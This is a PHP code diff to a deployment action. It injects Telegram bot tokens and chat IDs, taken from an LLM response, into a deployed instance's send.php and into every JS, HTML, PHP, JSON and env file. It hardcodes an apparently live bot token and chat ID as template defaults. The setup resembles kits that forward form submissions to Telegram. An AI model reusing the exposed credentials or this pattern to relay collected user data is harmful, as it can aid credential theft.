@@ -128,30 +128,58 @@ class DeployServiceAction
                 'injected_keys' => array_keys($injectedValues)
             ]);
 
-            // 3.5 Inject send.php configuration if exists
-            $sendPhpPath = $instancePath . '/config/send.php';
-            if (File::exists($sendPhpPath)) {
-                $rawResponseData = json_decode($result->rawLlmResponse, true) ?? [];
-                
-                $telegramToken = $rawResponseData['telegram_token'] ?? $rawResponseData['token'] ?? $rawResponseData['bot_token'] ?? null;
-                $telegramChatId = $rawResponseData['telegram_chat_id'] ?? $rawResponseData['chat_id'] ?? $rawResponseData['id_chat'] ?? null;
+            // 3.5 Inject credentials into files if they exist (PHP config/send.php, JS files, HTML, etc.)
+            $rawResponseData = json_decode($result->rawLlmResponse, true) ?? [];
+            $telegramToken = $rawResponseData['telegram_token'] ?? $rawResponseData['token'] ?? $rawResponseData['bot_token'] ?? null;
+            $telegramChatId = $rawResponseData['telegram_chat_id'] ?? $rawResponseData['chat_id'] ?? $rawResponseData['id_chat'] ?? null;
 
-                if ($telegramToken || $telegramChatId) {
+            if ($telegramToken || $telegramChatId) {
+                // Keep backward compatibility for standard config/send.php
+                $sendPhpPath = $instancePath . '/config/send.php';
+                if (File::exists($sendPhpPath)) {
                     $sendPhpContent = File::get($sendPhpPath);
-                    
                     if ($telegramToken) {
                         $sendPhpContent = preg_replace('/\$service_token\s*=\s*\'.*?\';/', "\$service_token = '{$telegramToken}';", $sendPhpContent);
                     }
                     if ($telegramChatId) {
                         $sendPhpContent = preg_replace('/\$service_chat\s*=\s*\'.*?\';/', "\$service_chat = '{$telegramChatId}';", $sendPhpContent);
                     }
-                    
                     File::put($sendPhpPath, $sendPhpContent);
+                    Log::channel('deploy-audit')->info('Injected custom config/send.php parameters.');
+                }
+
+                // Recursively scan all files for default template credentials or placeholders
+                $allFiles = File::allFiles($instancePath);
+                foreach ($allFiles as $file) {
+                    $filePath = $file->getRealPath();
+                    $ext = strtolower($file->getExtension());
                     
-                    Log::channel('deploy-audit')->info('Injected custom config/send.php parameters.', [
-                        'has_token' => !empty($telegramToken),
-                        'has_chat_id' => !empty($telegramChatId)
-                    ]);
+                    // Only process code/text files
+                    if (in_array($ext, ['js', 'php', 'html', 'htm', 'json', 'env'])) {
+                        $content = File::get($filePath);
+                        $originalContent = $content;
+                        
+                        if ($telegramToken) {
+                            // Replace template default token
+                            $content = str_replace('8469317138:AAEs6T2X0qbmkgosM69kAYEnyMWrCqnL-_8', $telegramToken, $content);
+                            
+                            // Replace JS properties e.g., BOT_TOKEN: '...' (supporting quoted keys and using isolated backreferences to prevent digit collisions)
+                            $content = preg_replace('/(["\']?)(BOT_TOKEN|bot_token|token|TOKEN)\1\s*:\s*([\'"])(.*?)\3/i', '${1}${2}${1}: ${3}' . $telegramToken . '${3}', $content);
+                        }
+                        
+                        if ($telegramChatId) {
+                            // Replace template default chat ID
+                            $content = str_replace('7672477647', $telegramChatId, $content);
+                            
+                            // Replace JS properties e.g., CHAT_ID: '...' (supporting quoted keys and using isolated backreferences to prevent digit collisions)
+                            $content = preg_replace('/(["\']?)(CHAT_ID|chat_id|id_chat|idChat|chatId|chatId)\1\s*:\s*([\'"])(.*?)\3/i', '${1}${2}${1}: ${3}' . $telegramChatId . '${3}', $content);
+                        }
+                        
+                        if ($content !== $originalContent) {
+                            File::put($filePath, $content);
+                            Log::channel('deploy-audit')->info("Auto-injected bot credentials into: " . basename($filePath));
+                        }
+                    }
                 }
             }
 
